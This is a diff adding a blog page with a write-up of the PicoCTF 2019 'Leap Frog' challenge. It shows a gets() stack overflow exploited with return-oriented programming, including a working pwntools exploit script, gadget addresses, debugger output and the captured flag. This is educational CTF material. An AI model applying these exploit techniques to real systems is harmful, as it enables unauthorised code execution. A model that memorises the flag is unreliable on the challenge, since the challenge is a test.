@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || PicoCTF 2019 - Leap Frog</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">PicoCTF 2019 - Leap Frog</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="June 29, 2020">
+      Jun 29
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/ctf">CTF</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series"></a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/rop">rop</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="description">Description</h1>
+<blockquote>
+<p>Can you jump your way to win in the following program and get the flag? You can find the program in /problems/leap-frog_4_32907c7b6e253bd5d9422083e7243619 on the shell server? Source.</p>
+</blockquote>
+<ul>
+<li>Try and call the functions in the correct order!</li>
+<li>Remember, you can always call main() again!</li>
+</ul>
+<h1 id="solution">Solution</h1>
+<p>Let&rsquo;s first have a look at the source code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+
+<span class="cp">#define FLAG_SIZE 64
+</span><span class="cp"></span>
+<span class="kt">bool</span> <span class="n">win1</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+<span class="kt">bool</span> <span class="n">win2</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+<span class="kt">bool</span> <span class="n">win3</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">leapA</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">win1</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">leap2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">arg_check</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">win3</span> <span class="o">&amp;&amp;</span> <span class="n">arg_check</span> <span class="o">==</span> <span class="mh">0xDEADBEEF</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">win2</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">win3</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wrong Argument. Try Again.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nope. Try a little bit harder.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">leap3</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">win1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">win1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">win3</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nope. Try a little bit harder.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">display_flag</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAG_SIZE</span><span class="p">];</span>
+  <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+  <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;&#39;flag.txt&#39; missing in the current directory!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">file</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">win1</span> <span class="o">&amp;&amp;</span> <span class="n">win2</span> <span class="o">&amp;&amp;</span> <span class="n">win3</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">win1</span> <span class="o">||</span> <span class="n">win3</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nice Try! You&#39;re Getting There!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You won&#39;t get the flag that easy..</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter your input&gt; &#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">win3</span><span class="p">)</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;yes it works</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+  <span class="c1">// Set the gid to the effective gid
+</span><span class="c1"></span>  <span class="c1">// this prevents /bin/sh from dropping the privileges
+</span><span class="c1"></span>  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+  <span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div><p>The vulnerability is due to the usage of the <code>gets()</code> function which doesn&rsquo;t check for overflows, which allows us to overwrite the return address and take control of the program&rsquo;s execution.</p>
+<p>We can call <code>display_flag()</code> to print the flag, we only need the booleans <code>win1</code>, <code>win2</code> and <code>win3</code> to be true.</p>
+<p>Let&rsquo;s do a first test, and see if we can hit the message &ldquo;Nice Try! You&rsquo;re Getting There!&rdquo; by calling <code>leapA()</code> and <code>display_flag()</code></p>
+<h2 id="triggering-the-nice-try">Triggering the &ldquo;Nice Try!&rdquo;</h2>
+<p>We need a dummy <code>flag.txt</code> if we want to debug our binary, so let&rsquo;s create one:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ echo &#34;lizard-pickle-circle-string&#34; &gt; flag.txt
+</code></pre></div><p>Run some recon on the binary:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ checksec rop 
+[*] &#39;/tmp/rop&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+$ file rop          
+rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9c0b1f6ff74cb90e5df0a29887132b6f29bff643, not stripped
+
+</code></pre></div><p>We will run the binary with gdb and compute the length of the padding so that we control EIP:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ gdb rop
+gef➤  pattern create
+[+] Generating a pattern of 1024 bytes
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
+[+] Saved as &#39;$_gef0&#39;
+gef➤  r
+Starting program: /tmp/rop 
+Enter your input&gt; aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616168 in ?? ()
+gef➤  pattern search haaa
+[+] Searching &#39;haaa&#39;
+[+] Found at offset 25 (little-endian search) likely
+[+] Found at offset 28 (big-endian search) 
+</code></pre></div><p>Offset is 28 as indicated and we can verify it with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤ r &lt;&lt;&lt; $(python2 -c &#34;print(&#39;O&#39;*28+&#39;ABCD&#39;)&#34;)
+Starting program: /tmp/rop &lt;&lt;&lt; $(python2 -c &#34;print(&#39;O&#39;*28+&#39;ABCD&#39;)&#34;)
+Enter your input&gt; 
+Program received signal SIGSEGV, Segmentation fault.
+0x44434241 in ?? ()
+</code></pre></div><p>EIP is under our control and equal to the <code>ABCD</code> address we defined earlier.</p>
+<p>Since the binary doesn&rsquo;t have PIE, we can retrieve the addresses of the functions/variables of interest with <code>nm</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nm rop
+080486b3 T display_flag
+080485fd T leap2
+08048666 T leap3
+080485e6 T leapA                            
+0804a03d B win1
+0804a03e B win2
+0804a03f B win3
+
+</code></pre></div><p>First, let&rsquo;s try to call leapA and display_flag() and see if we can hit the message &ldquo;Nice Try! You&rsquo;re Getting There!&rdquo;</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
+
+<span class="n">BINARY_NAME</span> <span class="o">=</span> <span class="s2">&#34;rop&#34;</span>
+
+<span class="k">def</span> <span class="nf">build_payload</span><span class="p">():</span>
+    <span class="n">LEAPA</span> <span class="o">=</span> <span class="mh">0x080485e6</span>
+    <span class="n">FLAG</span>  <span class="o">=</span> <span class="mh">0x080486b3</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Z&#34;</span> <span class="o">*</span> <span class="mi">28</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">LEAPA</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY_NAME</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">()</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./solve.py NOPTRACE
+[!] Could not find executable &#39;rop&#39; in $PATH, using &#39;./rop&#39; instead
+[+] Starting local process &#39;./rop&#39;: pid 116894
+[*] b&#39;ZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\xe6\x85\x04\x08\xb3\x86\x04\x08&#39;
+b&#39;Enter your input&gt; &#39;
+[*] Switching to interactive mode
+Nice Try! You&#39;re Getting There!
+[*] Got EOF while reading in interactive
+
+</code></pre></div><p>Success! Now, let&rsquo;s see how we can actually get &ldquo;there&rdquo;&hellip;</p>
+<h2 id="3-booleans">3 Booleans</h2>
+<p>To win, the 3 booleans win1, win2, win3 must be true:</p>
+<ul>
+<li>
+<p>toggling win1 is easy, calling leapA() as we did earlier works</p>
+</li>
+<li>
+<p>toggling win2 can be done if we have the right argument and win3 is true</p>
+</li>
+<li>
+<p>the real trouble is win3&hellip; There is no way we can toggle win3 by just calling leap3&hellip; because  win1 needs to be false and true at the same time:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">leap3</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">win1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">win1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">win3</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></li>
+</ul>
+<p>So, we will need to use some ROP to convince win3 to be true. I used ropper to list the available gadgets:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ropper --file rop --badbytes &#34;0A&#34; 
+</code></pre></div><p>Not many gadgets around here, especially no <code>pop eax</code> or <code>pop ecx</code> for example, it would have been practical to have them around :(( Here&rsquo;s a couple that seemed interesting:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x08048409: pop ebx; ret; 
+0x080485c4: mov byte ptr [0x804a03c], 1; leave; ret; 
+0x080485f3: mov byte ptr [eax + 0x3d], 1; nop; pop ebp; ret;
+0x08048b3c: inc ecx; ret; 
+0x0804882d: mov eax, dword ptr [esp]; ret; 
+</code></pre></div><h3 id="plan-1-jump-on-win3--true">Plan 1: jump on win3 = true</h3>
+<p>The first idea was, instead of calling leap3, jump directly on the part where win3 is set to true:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x08048690 &lt;+42&gt;:	mov    BYTE PTR [eax+0x3f],0x1
+</code></pre></div><p>So we modify our payload to look like this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">LEAPA</span><span class="p">)</span>      <span class="c1"># toggle win1</span>
+ <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x08048690</span><span class="p">)</span> <span class="c1"># mov byte ptr [eax + 0x3f], 1</span>
+</code></pre></div><p>This does effectively set win3 to true, buuuuut, it will blow up the stack, because we skipped the prologue of the function, but we still have an epilogue&hellip; The result is a sigv on 0x80486ae</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  p (int)win3
+$1 = 0x1
+gef➤  p (int)win1
+$2 = 0x10001
+</code></pre></div><p>Also win1 is equal to a weird value :)))</p>
+<h3 id="plan-2-jump-on-win3--true-but-with-stack-fixing">Plan 2: jump on win3 = true but with stack fixing</h3>
+<p>Same than plan 1, we jump on win3 = true, but what if we try to fix the stack somehow?</p>
+<p>Using these:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x080485fb: pop ebp; ret;
+0x08048829: lea esp, [ecx - 4]; ret; 
+0x08048828: pop ebp; lea esp, [ecx - 4]; ret;
+0x08048826: pop ecx; pop ebx; pop ebp; lea esp, [ecx - 4]; ret; 
+</code></pre></div><p>I debugged the binary by putting a breakpoint on $eip = 0x0804866a</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> 0x0804866a  →  &lt;leap3+4&gt; sub esp, 0x4
+</code></pre></div><p>to spy on the value of esp and ebp</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$esp   : 0xffffc638  →  &#34;OOOOOOOO&#34; then 0xffffc634
+$ebp   : 0xffffc63c  →  &#34;OOOO&#34;
+</code></pre></div><p>Edit the payload, try again:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">    payload += pack(LEAPA) # toggle win1
+    payload += pack(0x08048826) # pop ecx; pop ebx; pop ebp; lea esp, [ecx - 4]; ret;
+    payload += pack(0xffffc638) # value of ecx to be loaded in esp
+    payload += pack(0xAAAAAAAA) # junk for ebx
+    payload += pack(0xffffc63c) # value of ebp
+</code></pre></div><p>It kinda works&hellip; until we get to the <code>ret</code>&hellip; and it dies :(</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$eip   : 0x0804882c  →  &lt;main+99&gt; ret 
+</code></pre></div><h3 id="plan-3-gets">Plan 3: gets()</h3>
+<p>This is where I&rsquo;m out of ideas and go poke my bestie  ~~ It turns out, there&rsquo;s a very elegant solution, one I didn&rsquo;t even know about: you can use the <code>gets</code> function!</p>
+<p>By overriding the argument of gets in the ebx register, you can basically write where you want.</p>
+<p>With this &ldquo;write-what-where&rdquo; primitive, we can load the address of <code>win1</code> in the ebx register, call gets(), write &ldquo;\x01\x01\x01&rdquo; in memory and override the 3 booleans in one go. Then we just call display_flag and we&rsquo;re done.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">BINARY_NAME</span> <span class="o">=</span> <span class="s2">&#34;rop&#34;</span>
+<span class="n">IS_REMOTE</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">build_payload</span><span class="p">(</span><span class="n">elf</span><span class="p">):</span>
+    <span class="n">gets_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;gets&#34;</span><span class="p">]</span>
+    <span class="n">win1_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;win1&#34;</span><span class="p">]</span>
+    <span class="n">flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;display_flag&#34;</span><span class="p">]</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;gets addr 0x{gets_addr:x}&#34;</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;win1 addr 0x{win1_addr:x}&#34;</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;display_flag addr 0x{flag_addr:x}&#34;</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Z&#34;</span> <span class="o">*</span> <span class="mi">28</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">gets_addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x08048409</span><span class="p">)</span> <span class="c1"># pop ebx; ret;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">win1_addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY_NAME</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">IS_REMOTE</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;2019shell1.picoctf.com&#34;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s2">&#34;kylma&#34;</span><span class="p">,</span> <span class="n">ssh_agent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">connected</span><span class="p">():</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">BINARY_NAME</span><span class="p">,</span> <span class="n">cwd</span><span class="o">=</span><span class="s2">&#34;/problems/leap-frog_4_32907c7b6e253bd5d9422083e7243619&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x01\x01\x01</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>Final result:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./solve.py NOPTRACE
+[*] &#39;/tmp/rop&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Connecting to 2019shell1.picoctf.com on port 22: Done
+[*] kylma@2019shell1.picoctf.com:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     Enabled
+[+] Starting remote process b&#39;rop&#39; on 2019shell1.picoctf.com: pid 2133457
+[*] gets addr 0x8048430
+[*] win1 addr 0x804a03d
+[*] display_flag addr 0x80486b3
+b&#39;ZZZZZZZZZZZZZZZZZZZZZZZZZZZZ0\x84\x04\x08\t\x84\x04\x08=\xa0\x04\x08\xb3\x86\x04\x08&#39;
+b&#39;Enter your input&gt; &#39;
+[!] Skipping debug attach since context.noptrace==True
+[*] Switching to interactive mode
+picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_183d3d88}
+[*] Got EOF while reading in interactive
+
+</code></pre></div><p>Flag: <code>picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_183d3d88}</code></p>
+<p><img src="kitten_wants_explanation.gif" alt="kitten_wants_explanation.gif"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
